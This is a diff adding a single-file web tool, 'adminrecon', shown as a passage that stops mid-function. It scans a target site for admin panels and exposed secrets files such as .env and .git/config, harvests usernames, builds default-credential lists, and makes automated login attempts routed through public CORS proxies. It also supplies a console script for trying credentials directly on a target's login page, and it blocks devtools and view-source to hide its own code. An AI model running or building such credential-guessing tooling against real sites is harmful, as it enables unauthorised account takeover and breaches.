@@ -1,0 +1,1224 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="robots" content="index,follow">
+<meta name="author" content="YOUR NAME">
+<meta name="description" content="Admin surface recon and credential candidate generator">
+<title>adminrecon</title>
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='7' fill='%230b0e14'/%3E%3Ctext x='16' y='23' font-family='monospace' font-size='17' fill='%234da3ff' text-anchor='middle'%3Ea%3C/text%3E%3C/svg%3E">
+<!--
+  adminrecon — single-file admin recon tool
+  (c) 2026 YOUR NAME. All rights reserved.
+-->
+<style>
+:root{--bg:#0b0e14;--panel:#121722;--panel2:#161d2b;--line:#232c3d;--txt:#d7dee9;
+--dim:#7d8a9e;--acc:#4da3ff;--ok:#31c48d;--warn:#f0b429;--bad:#f45b69}
+*{box-sizing:border-box}
+html,body{-webkit-tap-highlight-color:transparent}
+body{margin:0;background:var(--bg);color:var(--txt);
+font:14px/1.55 ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;
+user-select:none;-webkit-user-select:none;-webkit-touch-callout:none}
+input,textarea,.selectable{user-select:text;-webkit-user-select:text}
+img,a{-webkit-user-drag:none}
+header{padding:22px 26px 14px;border-bottom:1px solid var(--line);background:var(--panel)}
+h1{margin:0 0 4px;font-size:17px;letter-spacing:.4px}
+h1 span{color:var(--acc)}
+.sub{color:var(--dim);font-size:12px}
+main{padding:20px 26px 40px;max-width:1240px}
+.row{display:flex;gap:10px;flex-wrap:wrap}
+input[type=text]{flex:1 1 360px;min-width:230px;background:var(--panel2);
+border:1px solid var(--line);color:var(--txt);padding:11px 13px;border-radius:6px;
+font:inherit;outline:none}
+input[type=text]:focus{border-color:var(--acc)}
+#ckey{flex:0 1 150px;min-width:120px;padding:3px 7px;font-size:12px}
+button{background:var(--acc);color:#04101f;border:0;padding:11px 20px;border-radius:6px;
+font:inherit;font-weight:700;cursor:pointer}
+button:disabled{opacity:.45;cursor:not-allowed}
+button.ghost{background:transparent;color:var(--txt);border:1px solid var(--line);font-weight:400}
+button.ghost:hover:not(:disabled){border-color:var(--acc);color:var(--acc)}
+.opts{display:flex;gap:16px;margin:14px 0 4px;flex-wrap:wrap;color:var(--dim);font-size:12px;align-items:center}
+.opts label{display:flex;align-items:center;gap:6px;cursor:pointer}
+.opts input[type=checkbox]{accent-color:var(--acc)}
+select,input[type=number]{background:var(--panel2);border:1px solid var(--line);color:var(--txt);
+border-radius:4px;padding:3px 6px;font:inherit;font-size:12px}
+.pills{display:flex;gap:6px;flex-wrap:wrap;margin-top:10px}
+.pill{font-size:10.5px;padding:2px 8px;border-radius:10px;border:1px solid var(--line);color:var(--dim)}
+.pill.ok{color:var(--ok);border-color:var(--ok)}
+.pill.fail{color:var(--bad);border-color:var(--bad)}
+.pill.nokey{color:var(--warn);border-color:var(--warn)}
+.grid{display:grid;grid-template-columns:1fr 1fr;gap:16px;margin-top:18px}
+@media(max-width:900px){.grid{grid-template-columns:1fr}}
+.card{background:var(--panel);border:1px solid var(--line);border-radius:8px;overflow:hidden}
+.card h2{margin:0;padding:11px 14px;font-size:12px;text-transform:uppercase;letter-spacing:1px;
+color:var(--dim);border-bottom:1px solid var(--line);background:var(--panel2);
+display:flex;justify-content:space-between;align-items:center}
+.card h2 b{color:var(--acc);font-size:11px}
+.log{height:230px;overflow:auto;padding:10px 14px;font-size:12px;color:var(--dim)}
+.log div{padding:1px 0;white-space:pre-wrap;word-break:break-word}
+.log .e{color:var(--bad)}.log .t{color:var(--warn)}.log .g{color:var(--ok)}
+table{width:100%;border-collapse:collapse;font-size:12px}
+th{text-align:left;padding:7px 10px;color:var(--dim);font-weight:400;
+border-bottom:1px solid var(--line);background:var(--panel2)}
+td{padding:7px 10px;border-bottom:1px solid #1a2231;word-break:break-all;vertical-align:top}
+.scroll{max-height:420px;overflow:auto}
+.badge{font-size:10px;padding:1px 6px;border-radius:3px;border:1px solid;white-space:nowrap}
+.b-high{color:var(--bad);border-color:var(--bad)}
+.b-medium{color:var(--warn);border-color:var(--warn)}
+.b-low,.b-info{color:var(--dim);border-color:var(--line)}
+.b-ok{color:var(--ok);border-color:var(--ok)}
+.cred{color:var(--ok)}.pw{color:var(--warn)}
+.empty{padding:22px 14px;color:var(--dim);font-size:12px}
+.bar{display:flex;gap:8px;padding:9px 14px;border-top:1px solid var(--line);background:var(--panel2);flex-wrap:wrap}
+.bar button{padding:6px 11px;font-size:11px;font-weight:400}
+.stats{display:flex;gap:20px;padding:12px 0 0;font-size:12px;color:var(--dim);flex-wrap:wrap}
+.stats b{color:var(--txt);font-size:15px;display:block}
+a{color:var(--acc);text-decoration:none}
+a:hover{text-decoration:underline}
+footer{margin-top:26px;padding:16px 26px 30px;border-top:1px solid var(--line);
+color:var(--dim);font-size:11px;display:flex;justify-content:space-between;gap:14px;flex-wrap:wrap}
+.note{background:#1a1408;border:1px solid #3d3110;color:#c9a54a;padding:9px 12px;
+border-radius:6px;font-size:11.5px;margin-top:14px;display:none}
+.note.on{display:block}
+.hint{color:var(--dim);font-size:11.5px;margin:0 0 8px;line-height:1.5}
+.tester-body{padding:12px 14px}
+textarea{width:100%;min-height:90px;background:var(--panel2);border:1px solid var(--line);
+color:var(--txt);border-radius:6px;padding:9px 11px;font:12px/1.5 ui-monospace,monospace;
+resize:vertical;outline:none}
+textarea:focus{border-color:var(--acc)}
+.tick{background:none;border:1px solid var(--line);color:var(--dim);border-radius:4px;
+padding:0 5px;font-size:11px;cursor:pointer;line-height:1.6}
+.tick.on{color:var(--ok);border-color:var(--ok)}
+tr.done td{opacity:.38}
+tr.done td.cred,tr.done td.pw{text-decoration:line-through}
+#dt{position:fixed;right:12px;bottom:12px;font-size:10px;padding:3px 8px;border-radius:4px;
+background:#2a1c05;border:1px solid #5c400a;color:#e0b046;display:none;z-index:60}
+body.devtools #dt{display:block}
+#ctx{position:fixed;z-index:9999;display:none;min-width:190px;background:#0f1420;
+border:1px solid #2b3548;border-radius:6px;padding:5px;box-shadow:0 12px 34px #000a;font-size:12px}
+#ctx div{padding:7px 10px;border-radius:4px;cursor:pointer;color:var(--txt)}
+#ctx div:hover{background:#1d2636}
+#ctx div.dis{color:#4d586b;cursor:default;background:none}
+#ctx hr{border:0;border-top:1px solid #222c3d;margin:4px 0}
+</style>
+</head>
+<body>
+<header>
+  <h1>admin<span>recon</span></h1>
+  <div class="sub">fingerprint &middot; admin surface discovery &middot; credential candidates &middot; in-page tester</div>
+</header>
+
+<main>
+  <div class="row">
+    <input id="url" type="text" placeholder="target.example.com" autocomplete="off"
+      spellcheck="false" draggable="false">
+    <button id="go">Scan</button>
+    <button id="stop" class="ghost" disabled>Stop</button>
+  </div>
+
+  <div class="opts">
+    <label><input type="checkbox" id="verify" checked> attempt logins</label>
+    <label><input type="checkbox" id="deep"> deep mode</label>
+    <label>max attempts <input type="number" id="maxa" value="16" min="1" max="40"></label>
+    <label>proxy <select id="proxy">
+      <option value="auto">auto fallback</option>
+      <option value="direct">direct only</option>
+      <option value="allorigins">allorigins</option>
+      <option value="codetabs">codetabs</option>
+      <option value="corsproxy">corsproxy.io (needs key)</option>
+      <option value="jina">jina reader</option>
+    </select></label>
+    <label>corsproxy key <input type="text" id="ckey" placeholder="optional" size="14"></label>
+  </div>
+
+  <div class="pills" id="pills"></div>
+  <div class="note" id="note"></div>
+
+  <div class="stats">
+    <div>admin surfaces<b id="s-admin">0</b></div>
+    <div>exposed files<b id="s-exp">0</b></div>
+    <div>usernames<b id="s-user">0</b></div>
+    <div>flagged<b id="s-ver" style="color:var(--ok)">0</b></div>
+  </div>
+
+  <div class="grid">
+    <div class="card">
+      <h2>console <b id="state">idle</b></h2>
+      <div class="log selectable" id="log"></div>
+    </div>
+    <div class="card">
+      <h2>admin surfaces &amp; exposure</h2>
+      <div class="scroll selectable" id="find"><div class="empty">nothing yet</div></div>
+    </div>
+  </div>
+
+  <div class="card" style="margin-top:16px">
+    <h2>credential candidates <b id="c-count">0</b></h2>
+    <div class="scroll selectable" id="creds"><div class="empty">nothing yet</div></div>
+    <div class="bar">
+      <button class="ghost" id="copy">copy as user:pass</button>
+      <button class="ghost" id="csv">download CSV</button>
+      <button class="ghost" id="json">download JSON</button>
+    </div>
+  </div>
+
+  <div class="card" style="margin-top:16px">
+    <h2>flagged logins <b id="v-count">0</b></h2>
+    <div class="scroll selectable" id="ver"><div class="empty">nothing yet</div></div>
+  </div>
+
+  <div class="card" style="margin-top:16px">
+    <h2>in-page tester <b id="t-state">fallback</b></h2>
+    <div class="tester-body">
+      <p class="hint">For sites the proxies can't reach. Paste the login page HTML below, then run the copied script in that page's console. It auto-discovers the live fields, types into them and clicks the real submit control, so SPAs and CSRF tokens both work. Stays on the page; hits land in localStorage under <b>__arhits</b>.</p>
+      <textarea id="paste" spellcheck="false" placeholder="paste the login page HTML here (Ctrl+U on the login page)"></textarea>
+      <div class="bar" style="border:0;background:none;padding:10px 0 0">
+        <button class="ghost" id="usePaste">parse fields from paste</button>
+        <button class="ghost" id="mkTester">copy tester script</button>
+        <button class="ghost" id="mkBookmark">copy bookmarklet</button>
+        <button class="ghost" id="mkDiag">copy diagnostic</button>
+      </div>
+      <div id="fields" class="hint"></div>
+    </div>
+  </div>
+</main>
+
+<footer>
+  <div>&copy; <span id="yr"></span> YOUR NAME &middot; all rights reserved</div>
+  <div>client-side only &middot; no data leaves your browser except scan requests</div>
+</footer>
+
+<div id="dt">devtools open</div>
+<div id="ctx"></div>
+
+<script>
+/* ============================================================
+   0. PROTECTION LAYER
+   ============================================================ */
+(function(){
+  'use strict';
+  var ALLOW_SHIFT = true;
+
+  document.addEventListener('contextmenu', function(e){
+    if (ALLOW_SHIFT && e.shiftKey) return;
+    e.preventDefault();
+    var sel = String(window.getSelection() || '');
+    var link = e.target.closest && e.target.closest('a');
+    var menu = document.getElementById('ctx');
+    menu.innerHTML = '';
+    var items = [
+      ['Copy selection', sel.length > 0, function(){ navigator.clipboard.writeText(sel); }],
+      ['Open link in new tab', !!link, function(){ window.open(link.href, '_blank', 'noopener'); }],
+      ['Copy link address', !!link, function(){ navigator.clipboard.writeText(link.href); }],
+      ['---', true, null],
+      ['Scan again', true, function(){ document.getElementById('go').click(); }],
+      ['About this page', true, function(){
+        alert('adminrecon — single-file client-side recon tool.\n\nSource is compiled and protected.\nShift + right click for the native browser menu.');
+      }]
+    ];
+    items.forEach(function(it){
+      if (it[0] === '---'){ menu.appendChild(document.createElement('hr')); return; }
+      var d = document.createElement('div');
+      d.textContent = it[0];
+      if (!it[1]) d.className = 'dis';
+      else d.addEventListener('click', function(){ it[2](); hideCtx(); });
+      menu.appendChild(d);
+    });
+    menu.style.display = 'block';
+    var w = menu.offsetWidth, h = menu.offsetHeight;
+    menu.style.left = Math.min(e.clientX, innerWidth - w - 8) + 'px';
+    menu.style.top = Math.min(e.clientY, innerHeight - h - 8) + 'px';
+  });
+
+  function hideCtx(){ document.getElementById('ctx').style.display = 'none'; }
+  document.addEventListener('click', hideCtx);
+  document.addEventListener('scroll', hideCtx, true);
+  document.addEventListener('keydown', function(e){ if (e.key === 'Escape') hideCtx(); });
+
+  document.addEventListener('keydown', function(e){
+    var k = e.key.toLowerCase();
+    if (e.key === 'F12'){ e.preventDefault(); return; }
+    if (!(e.ctrlKey || e.metaKey)) return;
+    if (e.shiftKey && ['i','j','c','k','e'].indexOf(k) > -1){ e.preventDefault(); return; }
+    if (!e.shiftKey && ['u','s'].indexOf(k) > -1){ e.preventDefault(); }
+  });
+
+  document.addEventListener('dragstart', function(e){
+    if (e.target.tagName === 'IMG') e.preventDefault();
+  });
+
+  document.addEventListener('copy', function(e){
+    var t = e.target;
+    if (t && t.closest && t.closest('input,textarea')) return;
+    var sel = String(window.getSelection() || '');
+    if (!sel || sel.length < 8) return;
+    e.clipboardData.setData('text/plain', sel + '\n\n-- via adminrecon');
+    e.preventDefault();
+  });
+
+  var open = false;
+  setInterval(function(){
+    var o = (outerWidth - innerWidth > 170) || (outerHeight - innerHeight > 170);
+    if (o !== open){ open = o; document.body.classList.toggle('devtools', o); }
+  }, 900);
+
+  var css = 'color:#4da3ff;font-weight:bold;font-size:13px';
+  console.log('%cadminrecon', css);
+  console.log('%c(c) YOUR NAME — source protected. Ctrl+U and F12 are intercepted.', 'color:#7d8a9e');
+  console.log('%cTip: Shift + right click still opens the native browser menu.', 'color:#7d8a9e');
+
+  document.getElementById('yr').textContent = new Date().getFullYear();
+})();
+
+/* ============================================================
+   1. CONFIG
+   ============================================================ */
+var CFG = {
+  concurrency: 4,
+  delay: 130,
+  timeout: 15000,
+  maxCandidates: 500
+};
+
+var ADMIN_PATHS = [
+  '/admin','/admin/','/admin/login','/admin/login/','/administrator',
+  '/administrator/index.php','/wp-admin/','/wp-login.php','/user/login',
+  '/login','/login/','/signin','/cpanel','/webmail','/manager/html',
+  '/phpmyadmin/','/pma/','/adminer.php','/jenkins/','/grafana/login',
+  '/gitlab/users/sign_in','/admin.php','/admin/index.php','/panel',
+  '/dashboard','/admincp','/moderator','/staff','/backend','/manage',
+  '/secure','/private','/cms','/umbraco/','/typo3/','/controlpanel'
+];
+
+var DEEP_PATHS = ADMIN_PATHS.concat([
+  '/admin/config','/admin/settings','/admin/users','/admin/account',
+  '/console','/system','/sysadmin','/superadmin','/operator','/api/admin',
+  '/swagger','/swagger-ui','/api/docs','/actuator','/actuator/env','/metrics',
+  '/server-status','/info.php','/adminarea','/admin/home','/admin/dashboard'
+]);
+
+var EXPOSED_PATHS = [
+  '/.env','/.env.local','/.env.bak','/.git/config','/.git/HEAD',
+  '/wp-config.php.bak','/wp-config.txt','/config.php.bak','/config.yml',
+  '/config.json','/composer.json','/backup.zip','/backup.sql','/db.sql',
+  '/dump.sql','/README.md','/robots.txt','/sitemap.xml','/.DS_Store',
+  '/phpinfo.php','/debug.log','/storage/logs/laravel.log'
+];
+
+var SIGS = {
+  wordpress: [/wp-content|wp-includes|wp-json/i],
+  joomla: [/\/media\/system\/js\/|option=com_/i],
+  drupal: [/drupal-settings-json|\/sites\/default\/files\//i],
+  laravel: [/laravel|csrf-token/i],
+  django: [/csrfmiddlewaretoken/i],
+  phpmyadmin: [/pma_|phpmyadmin/i],
+  grafana: [/grafana-app|public\/build\/grafana/i],
+  jenkins: [/jenkins/i],
+  gitlab: [/gitlab/i],
+  tomcat: [/apache tomcat/i],
+  magento: [/mage\/|magento/i],
+  prestashop: [/prestashop/i],
+  opencart: [/opencart|route=common\/home/i],
+  ghost: [/ghost-url/i],
+  shopify: [/cdn\.shopify\.com/i],
+  nextjs: [/__next_data__/i]
+};
+
+var SPA_MARK = /"spa"\s*:\s*"|__next_data__|data-reactroot|ng-version|id=["']root["']|id=["']app["']|vue\.runtime|react-dom|vue\.js|angular/;
+
+var DEFAULTS = {
+  wordpress: [['admin','admin'],['admin','password'],['admin','admin123'],['admin','wordpress'],['admin','changeme']],
+  joomla: [['admin','admin'],['admin','joomla'],['administrator','administrator']],
+  drupal: [['admin','admin'],['admin','drupal']],
+  phpmyadmin: [['root',''],['root','root'],['pma','pma'],['admin','admin']],
+  grafana: [['admin','admin'],['admin','grafana']],
+  jenkins: [['admin','admin'],['jenkins','jenkins']],
+  tomcat: [['tomcat','tomcat'],['manager','manager'],['both','tomcat'],['role1','tomcat']],
+  gitlab: [['root','password']],
+  magento: [['admin','admin123']],
+  generic: [['admin','admin'],['admin','password'],['admin','admin123'],
+            ['administrator','administrator'],['admin','letmein'],['admin','changeme'],
+            ['admin','123456'],['root','root'],['test','test'],['admin','P@ssw0rd']]
+};
+
+var PW_SEEDS = ['admin','password','123456','admin123','Password1','P@ssw0rd',
+  'secret','letmein','changeme','toor','qwerty','welcome','admin@123','Admin@123'];
+
+var USER_SEEDS = ['admin','administrator','root','superadmin','sysadmin',
+  'webmaster','operator','manager','owner','support','test'];
+
+var EMAIL_SEEDS = ['admin','info','administrator','support','webmaster','it','hr','office'];
+
+var OK_MARK = /log\s*out|sign\s*out|dashboard|control panel|wp-admin|admin panel|welcome back|my account/gi;
+var BAD_MARK = /incorrect|invalid|wrong|failed|try again|not recognised|not recognized|bad credentials|unauthori[sz]ed/gi;
+
+/* ============================================================
+   2. PROXY LAYER
+   ============================================================ */
+var PROXIES = {
+  direct: {
+    label: 'direct',
+    get: function(u){ return u; },
+    parse: async function(r){ return { status: r.status, body: await r.text() }; }
+  },
+  allorigins: {
+    label: 'allorigins',
+    get: function(u){ return 'https://api.allorigins.win/get?url=' + encodeURIComponent(u); },
+    parse: async function(r){
+      var j = await r.json();
+      var code = (j && j.status && j.status.http_code) || 0;
+      if (!code) throw new Error('unreachable upstream');
+      return { status: code, body: (j && j.contents) || '' };
+    }
+  },
+  codetabs: {
+    label: 'codetabs',
+    get: function(u){ return 'https://api.codetabs.com/v1/proxy?quest=' + encodeURIComponent(u); },
+    parse: async function(r){ return { status: r.status, body: await r.text() }; }
+  },
+  corsproxy: {
+    label: 'corsproxy.io',
+    get: function(u){
+      var k = $('#ckey').value.trim();
+      return 'https://corsproxy.io/?key=' + encodeURIComponent(k) + '&url=' + encodeURIComponent(u);
+    },
+    parse: async function(r){
+      var t = await r.text();
+      if (/keyless_legacy_url|invalid_api_key/.test(t)) throw new Error('needs API key');
+      if (/^\s*\{/.test(t)){
+        var j;
+        try { j = JSON.parse(t); } catch (e){ j = null; }
+        if (j && j.success === false) throw new Error(j.message || 'proxy refused');
+      }
+      return { status: r.status, body: t };
+    }
+  },
+  jina: {
+    label: 'jina',
+    get: function(u){ return 'https://r.jina.ai/' + u; },
+    parse: async function(r){
+      var t = await r.text();
+      if (!t || t.length < 20) throw new Error('empty read');
+      return { status: 200, body: t };
+    }
+  }
+};
+
+var AUTO_ORDER = ['direct', 'allorigins', 'codetabs', 'corsproxy', 'jina'];
+var HEALTH = {};
+var cache = new Map();
+
+function timeoutSignal(ms){
+  var c = new AbortController();
+  setTimeout(function(){ c.abort(); }, ms || CFG.timeout);
+  return c.signal;
+}
+
+function renderPills(){
+  var box = $('#pills');
+  box.innerHTML = '';
+  Object.keys(PROXIES).forEach(function(n){
+    var st = HEALTH[n] || 'unknown';
+    var d = document.createElement('span');
+    d.className = 'pill ' + (st === 'ok' ? 'ok' : st === 'fail' ? 'fail' : st === 'nokey' ? 'nokey' : '');
+    d.textContent = PROXIES[n].label + ' · ' +
+      (st === 'ok' ? 'alive' : st === 'fail' ? 'dead' : st === 'nokey' ? 'no key' : '?');
+    box.appendChild(d);
+  });
+}
+
+async function healthCheck(){
+  var names = Object.keys(PROXIES);
+  await Promise.all(names.map(async function(n){
+    if (n === 'direct'){ HEALTH[n] = 'ok'; return; }
+    if (n === 'corsproxy' && !$('#ckey').value.trim()){ HEALTH[n] = 'nokey'; return; }
+    try {
+      var r = await fetch(PROXIES[n].get('https://example.com/'), { signal: timeoutSignal(9000) });
+      var out = await PROXIES[n].parse(r);
+      HEALTH[n] = (out.body && /example/i.test(out.body)) ? 'ok' : 'fail';
+    } catch (e){ HEALTH[n] = 'fail'; }
+  }));
+  renderPills();
+  log('proxy check: ' + Object.keys(HEALTH)
+    .filter(function(n){ return HEALTH[n] === 'ok'; }).join(', '));
+}
+
+async function viaProxy(url){
+  var chosen = $('#proxy').value;
+  var order = (chosen === 'auto' ? AUTO_ORDER : [chosen]).filter(function(n){
+    if (!PROXIES[n]) return false;
+    if (chosen === 'auto') return HEALTH[n] === 'ok' || HEALTH[n] === undefined;
+    return true;
+  });
+  if (!order.length) throw new Error('no usable proxy — run the check or add a key');
+
+  var reasons = [];
+  for (var i = 0; i < order.length; i++){
+    var name = order[i];
+    try {
+      var r = await fetch(PROXIES[name].get(url), { signal: timeoutSignal(), redirect: 'follow' });
+      if (r.status === 429){ HEALTH[name] = 'fail'; throw new Error('rate limited'); }
+      var out = await PROXIES[name].parse(r);
+      return out;
+    } catch (e){
+      var msg = String(e.message || e);
+      if (msg === 'Failed to fetch') msg = 'blocked or CORS denied';
+      reasons.push(name + ': ' + msg);
+      if (name === 'corsproxy' && /key/.test(msg)) HEALTH.corsproxy = 'nokey';
+    }
+  }
+  renderPills();
+  throw new Error(reasons.join('  |  '));
+}
+
+async function grab(url){
+  if (cache.has(url)) return cache.get(url);
+  var res;
+  try { res = await viaProxy(url); }
+  catch (e){ res = { status: 0, body: '', err: String(e.message || e) }; }
+  cache.set(url, res);
+  return res;
+}
+
+async function postThrough(url, data){
+  var body = new URLSearchParams(data).toString();
+  var key = $('#ckey').value.trim();
+  var target = key
+    ? 'https://corsproxy.io/?key=' + encodeURIComponent(key) + '&url=' + encodeURIComponent(url)
+    : 'https://corsproxy.io/?' + encodeURIComponent(url);
+  var r = await fetch(target, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+    body: body, signal: timeoutSignal()
+  });
+  var t = await r.text();
+  if (/keyless_legacy_url/.test(t)) throw new Error('needs API key');
+  return { status: r.status, body: t };
+}
+
+/* ============================================================
+   3. STATE + UI HELPERS
+   ============================================================ */
+var S = { root: '', findings: [], creds: [], flagged: [], forms: [],
+          aborted: false, tech: [], pasteForm: null, emailMode: false, spa: false };
+
+var $ = function(s){ return document.querySelector(s); };
+
+function esc(v){
+  return String(v).replace(/[&<>"]/g, function(c){
+    return { '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;' }[c];
+  });
+}
+
+function log(msg, cls){
+  var d = document.createElement('div');
+  if (cls) d.className = cls;
+  d.textContent = msg;
+  var box = $('#log');
+  box.appendChild(d);
+  box.scrollTop = box.scrollHeight;
+}
+
+function setState(txt, color){
+  $('#state').textContent = txt;
+  $('#state').style.color = color || '';
+}
+
+function sleep(ms){ return new Promise(function(r){ setTimeout(r, ms); }); }
+
+function note(msg){
+  var n = $('#note');
+  if (!msg){ n.classList.remove('on'); return; }
+  n.textContent = msg;
+  n.classList.add('on');
+}
+
+function resetUI(){
+  S.findings = []; S.creds = []; S.flagged = []; S.tech = []; S.forms = [];
+  S.aborted = false; S.emailMode = false; S.spa = false;
+  cache.clear();
+  $('#log').innerHTML = '';
+  $('#find').innerHTML = '<div class="empty">nothing yet</div>';
+  $('#creds').innerHTML = '<div class="empty">nothing yet</div>';
+  $('#ver').innerHTML = '<div class="empty">nothing yet</div>';
+  $('#c-count').textContent = '0';
+  $('#v-count').textContent = '0';
+  ['s-admin','s-exp','s-user','s-ver'].forEach(function(id){ $('#' + id).textContent = '0'; });
+  note('');
+}
+
+function addFinding(f){
+  if (S.findings.some(function(x){ return x.url === f.url && x.kind === f.kind; })) return;
+  S.findings.push(f);
+  $('#s-admin').textContent = S.findings.filter(function(x){ return x.kind === 'admin'; }).length;
+  $('#s-exp').textContent = S.findings.filter(function(x){ return x.kind === 'exposed'; }).length;
+  renderFindings();
+}
+
+function renderFindings(){
+  if (!S.findings.length) return;
+  $('#find').innerHTML = '<table><thead><tr><th>type</th><th>url</th><th>detail</th><th>sev</th></tr></thead><tbody>' +
+    S.findings.map(function(f){
+      return '<tr><td>' + esc(f.kind) + '</td>' +
+        '<td><a href="' + esc(f.url) + '" target="_blank" rel="noreferrer noopener">' + esc(f.url) + '</a></td>' +
+        '<td>' + esc(f.detail) + '</td>' +
+        '<td><span class="badge b-' + esc(f.severity) + '">' + esc(f.severity) + '</span></td></tr>';
+    }).join('') + '</tbody></table>';
+}
+
+function addCred(c){
+  if (S.creds.some(function(x){ return x.username === c.username && x.password === c.password; })) return;
+  if (S.creds.length >= CFG.maxCandidates) return;
+  S.creds.push(c);
+  $('#c-count').textContent = S.creds.length;
+  var box = $('#creds');
+  if (!box.querySelector('table')){
+    box.innerHTML = '<table><thead><tr><th>#</th><th>username</th><th>password</th><th>source</th><th></th></tr></thead><tbody></tbody></table>';
+  }
+  var tr = document.createElement('tr');
+  tr.innerHTML = '<td>' + S.creds.length + '</td>' +
+    '<td class="cred">' + esc(c.username) + '</td>' +
+    '<td class="pw">' + (c.password ? esc(c.password) : '<i>empty</i>') + '</td>' +
+    '<td style="color:var(--dim)">' + esc(c.source) + '</td>' +
+    '<td><button class="tick" title="mark as working">&#10003;</button></td>';
+  tr.querySelector('.tick').addEventListener('click', function(){
+    tr.classList.toggle('done');
+    this.classList.toggle('on');
+  });
+  box.querySelector('tbody').appendChild(tr);
+}
+
+function addFlagged(f){
+  S.flagged.push(f);
+  $('#s-ver').textContent = S.flagged.length;
+  $('#v-count').textContent = S.flagged.length;
+  var box = $('#ver');
+  if (!box.querySelector('table')){
+    box.innerHTML = '<table><thead><tr><th>signal</th><th>username</th><th>password</th><th>score</th><th>evidence</th><th></th></tr></thead><tbody></tbody></table>';
+  }
+  var tr = document.createElement('tr');
+  var good = f.score >= 45;
+  tr.innerHTML = '<td><span class="badge ' + (good ? 'b-ok' : 'b-medium') + '">' +
+    (good ? 'likely' : 'maybe') + '</span></td>' +
+    '<td class="cred">' + esc(f.username) + '</td><td class="pw">' + esc(f.password) + '</td>' +
+    '<td>' + f.score + '</td><td style="color:var(--dim)">' + esc(f.evidence) + '</td>' +
+    '<td><a href="' + esc(f.target) + '" target="_blank" rel="noreferrer noopener">open</a></td>';
+  box.querySelector('tbody').appendChild(tr);
+}
+
+/* ============================================================
+   4. SCAN STAGES
+   ============================================================ */
+function normalize(v){
+  v = v.trim();
+  if (!/^https?:\/\//i.test(v)) v = 'https://' + v;
+  return v;
+}
+
+function rootWord(){
+  try {
+    var h = new URL(S.root).hostname.replace(/^www\./, '');
+    return h.split('.')[0].replace(/[^a-z0-9]/gi, '').toLowerCase() || 'admin';
+  } catch (e){ return 'admin'; }
+}
+
+function hostParts(){
+  try {
+    var h = new URL(S.root).hostname.replace(/^www\./, '');
+    return { labels: h.split('.'), host: h, reg: h.split('.').slice(-2).join('.') };
+  } catch (e){ return { labels: [], host: '', reg: '' }; }
+}
+
+function abs(p){ return S.root + p.replace(/^\//, ''); }
+
+async function fingerprint(res){
+  var body = (res.body || '').slice(0, 250000);
+  Object.keys(SIGS).forEach(function(tech){
+    if (S.tech.indexOf(tech) > -1) return;
+    if (SIGS[tech].some(function(re){ return re.test(body); })){
+      S.tech.push(tech);
+      log('fingerprint: ' + tech, 't');
+    }
+  });
+  var gen = body.match(/<meta[^>]+name=["']generator["'][^>]+content=["']([^"']+)/i);
+  if (gen) addFinding({ kind:'meta', url:S.root, detail:'generator: ' + gen[1].slice(0, 70), severity:'low' });
+  var title = body.match(/<title[^>]*>([^<]{0,100})/i);
+  if (title) addFinding({ kind:'meta', url:S.root, detail:'title: ' + title[1].trim(), severity:'info' });
+  log('stack: ' + (S.tech.join(', ') || 'unknown'));
+}
+
+async function parseRobots(){
+  for (var i = 0; i < 2; i++){
+    var path = i === 0 ? '/robots.txt' : '/sitemap.xml';
+    var r = await grab(abs(path));
+    if (r.status !== 200 || !r.body) continue;
+    addFinding({ kind:'file', url:abs(path),
+      detail:path.slice(1) + ' readable (' + r.body.length + ' bytes)', severity:'low' });
+    r.body.split('\n').forEach(function(line){
+      line = line.trim();
+      if (/^(dis)?allow:/i.test(line)){
+        var p = line.split(':').slice(1).join(':').trim();
+        if (p && p !== '/' && /admin|login|panel|manage|private|internal/i.test(p)){
+          addFinding({ kind:'robots', url:abs(p), detail:'hidden path in robots', severity:'medium' });
+        }
+      }
+      var loc = line.match(/<loc>([^<]+)<\/loc>/);
+      if (loc && /user|author|admin/i.test(loc[1])){
+        addFinding({ kind:'sitemap', url:loc[1], detail:'user/author URL in sitemap', severity:'low' });
+      }
+    });
+    log(path + ' parsed');
+  }
+}
+
+async function probePaths(list){
+  log('probing ' + list.length + ' admin paths');
+  var queue = list.slice();
+  var workers = [];
+  for (var w = 0; w < CFG.concurrency; w++){
+    workers.push((async function(){
+      while (queue.length && !S.aborted){
+        var p = queue.shift();
+        var url = abs(p);
+        var r = await grab(url);
+        if (r.status && r.status < 400){
+          var low = (r.body || '').toLowerCase();
+          var hasPw = /type=["']password["']/.test(low);
+          if (r.status === 401 || r.status === 403){
+            addFinding({ kind:'admin', url:url, detail:'HTTP ' + r.status + ' (protected)', severity:'medium' });
+          } else if (hasPw || /admin|dashboard|control panel|log in|sign in/.test(low)){
+            var sev = hasPw ? 'high' : 'medium';
+            addFinding({ kind:'admin', url:url, detail:'HTTP ' + r.status + ' — login interface', severity:sev });
+            if (hasPw && S.forms.indexOf(url) === -1) S.forms.push(url);
+            log('[' + sev + '] ' + url);
+          }
+        }
+        await sleep(CFG.delay);
+      }
+    })());
+  }
+  await Promise.all(workers);
+}
+
+async function checkExposed(){
+  log('checking exposed files');
+  var queue = EXPOSED_PATHS.slice();
+  var workers = [];
+  for (var w = 0; w < CFG.concurrency; w++){
+    workers.push((async function(){
+      while (queue.length && !S.aborted){
+        var p = queue.shift();
+        var r = await grab(abs(p));
+        if (r.status === 200 && r.body && r.body.length > 20 && r.body.length < 2000000){
+          var sev = /^\.(env|git)|wp-config|config|backup|dump|db\.sql/.test(p.slice(1)) ? 'high' : 'low';
+          if (/DB_PASSWORD|APP_KEY|SECRET|api[_-]?key|password/i.test(r.body)) sev = 'high';
+          addFinding({ kind:'exposed', url:abs(p), detail:r.body.length + ' bytes exposed', severity:sev });
+          log('[exposed] ' + abs(p), 't');
+        }
+        await sleep(CFG.delay);
+      }
+    })());
+  }
+  await Promise.all(workers);
+}
+
+async function harvestUsers(){
+  log('harvesting usernames');
+  var found = [];
+
+  function add(name, src){
+    name = String(name || '').trim().toLowerCase();
+    if (!name || !/^[\w.\-@]{2,64}$/.test(name)) return;
+    if (found.indexOf(name) > -1) return;
+    found.push(name);
+    $('#s-user').textContent = found.length;
+    log('username: ' + name + ' (' + src + ')');
